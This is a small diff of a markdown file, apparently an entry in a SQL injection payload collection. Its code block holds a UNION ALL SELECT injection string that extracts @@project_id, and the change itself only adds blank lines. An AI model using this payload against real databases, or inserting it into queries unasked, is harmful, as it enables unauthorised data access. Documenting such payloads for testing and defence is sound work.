@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:21:05.529526+00:00'
 ```bash
 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name
 ```
+
+
